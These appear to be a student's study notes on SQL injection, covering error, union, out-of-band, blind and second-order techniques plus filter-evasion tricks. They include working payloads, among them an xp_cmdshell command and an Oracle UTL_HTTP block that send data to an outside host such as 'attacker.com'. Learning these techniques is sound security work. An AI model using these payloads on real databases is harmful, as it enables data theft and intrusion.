## In-band SQL Injection
### Error-Based SQL Injection
The attacker manipulates the SQL query to produce error messages from the database.

Example:

```sql
SELECT * FROM users WHERE id = 1 AND 1=CONVERT(int, (SELECT @@version))`
```

### Union-Based SQL Injection
The attacker uses the `UNION` SQL operator to combine the results of two or more SELECT statements into a single result, thereby retrieving data from other tables.

Example:

```sql
SELECT name, email FROM users WHERE id = 1 UNION ALL SELECT username, password FROM admin
```

## Out-of-band SQL Injection

Out-of-band SQL injection is used when the attacker cannot use the same channel to launch the attack and gather results or when the server responses are unstable. This technique relies on the database server making an out-of-band request (e.g., HTTP or DNS) to send the query result to the attacker. HTTP is normally used in out-of-band SQL injection to send the query result to the attacker's server. We will discuss it in detail in this room.

Some examples are explained below.

### MySQL and MariaDB
Write results of a query to a file:

```sql
SELECT sensitive_data FROM users INTO OUTFILE '/tmp/out.txt';
```

### Microsoft SQL Server (MSSSQL)
Using feature like `xp_cmdshell`, an attacker can execute shell commands directly from SQL queries:

```sql
EXEC xp_cmdshell 'bcp "SELECT sensitive_data FROM users" queryout "\\10.10.58.187\logs\out.txt" -c -T';
```

### Oracle
In Oracle databases, Out-of-band SQL injection can be executed using the [UTL_HTTP](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_HTTP.html) or [UTL_FILE](https://docs.oracle.com/en/database/oracle/oracle-database/19/arpls/UTL_FILE.html) packages. For instance, the UTL_HTTP package can be used to send HTTP requests with sensitive data:

```sql
DECLARE
  req UTL_HTTP.REQ;
  resp UTL_HTTP.RESP;
BEGIN
  req := UTL_HTTP.BEGIN_REQUEST('http://attacker.com/exfiltrate?sensitive_data=' || sensitive_data);
  UTL_HTTP.GET_RESPONSE(req);
END;
```

## Inferential (Blind) SQL Injection
Inferential SQL injection does not transfer data directly through the web application, making exploiting it more challenging. Instead, the attacker sends payloads and observes the application’s behaviour and response times to infer information about the database.

### Boolean-Based Blind SQL Injection
The attacker sends an SQL query to the database, forcing the application to return a different result based on a true or false condition.

Example:

```sql
SELECT * FROM users WHERE id = 1 AND 1=1 --true condition
```

Versus:

```sql
versus SELECT * FROM users WHERE id = 1 AND 1=2 -- false condition
```

The attacker can infer the result if the page content or behaviour changes based on the condition.

### Time-Based SQL Injection
The attacker sends an SQL query to the database, which delays the response for a specified time if the condition is true. By measuring the response time, the attacker can infer whether the condition is true or false.

Example:

```sql
SELECT * FROM users WHERE id = 1; IF (1=1) WAITFOR DELAY '00:00:05'--
```

## Second Order SQL Injections
User-supplied input is saved and subsequently used in a different part of the application.

In the following example we can add books to the app in the *add.php* page:

![[Pasted image 20251108215040.png|center|400]]


The PHP code that processes this form is this one:

```php
if (isset($_POST['submit'])) {
    $ssn = $conn->real_escape_string($_POST['ssn']);
    $book_name = $conn->real_escape_string($_POST['book_name']);
    $author = $conn->real_escape_string($_POST['author']);
    
    $sql = "INSERT INTO books (ssn, book_name, author) VALUES ('$ssn', '$book_name', '$author')";

    if ($conn->query($sql) === TRUE) {
        echo "<p class='text-green-500'>New book added successfully</p>";
    } else {
        echo "<p class='text-red-500'>Error: " . $conn->error . "</p>";
    }
```

If we introduce a book with the name *test'*:
1. `real_escape_string` will escape the quote: *test\'*.
2. MySQL engine interprets \ as escape character, so removes it from the value. The value stored is *test'*:
![[Pasted image 20251108215928.png|center|400]]

Then, in the *update.php* page, we can change the author and book name of the books. The code for updating is similar to this one:

```PHP
if ( isset($_POST['update'])) {
    $unique_id = $_POST['update'];
    $ssn = $_POST['ssn_' . $unique_id];
    $new_book_name = $_POST['new_book_name_' . $unique_id];
    $new_author = $_POST['new_author_' . $unique_id];

    $update_sql = "UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn'; INSERT INTO logs (page) VALUES ('update.php');";
```

So it can be seen that the ssn is used at the end of the first query. That means that we can inject queries by creating books with SSN's similar to these one: `'; <QUERY>-- -

## Filter evasion techniques
- Use alternativa operators: `||` and `&&` instead of `OR` and `AND`.
- URL encoding: `' OR 1=1--` --> `%27%20OR%201%3D1-`.
- Hexadecimal encoding: `admin` -> `0x61646d696e`.
- Unicode encoding: `admin` --> `\u0061\u0064\u006d\u0069\u006e`.
- Try different casing: `oR`, `SElEct`, `SE/**/LECT`…

### No-Quote SQL Injection
- Avoid quotes if possible: `' OR '1'='1` --> `OR 1=1`.
- Use SQL Comments to terminate the query: `admin'--` --> `admin--`.
- Use CONCAT to construct strings to prevent the use of quotes: `admin` --> `CONCAT(0x61, 0x64, 0x6d, 0x69, 0x6e)`, or directly `CONCAT('a', 'd', 'm', 'i', 'n')`.

### No Spaces Allowed
- Comments to replace spaces: `SELECT * FROM users WHERE name = 'admin'` --> `SELECT/**/*FROM/**/users/**/WHERE/**/name/**/='admin'`.
- Tab or newline characters: `SELECT * FROM users WHERE name = 'admin'` --> `SELECT\t*\tFROM\tusers\tWHERE\tname\t=\t'admin'`.
- Alternate characters:
	- `%09`: horizontal tab
	- `%0A`: line feed
	- `%0C`: form feed
	- `%0D`: carriage return
	- `%A0`: non-breaking space

## Keywords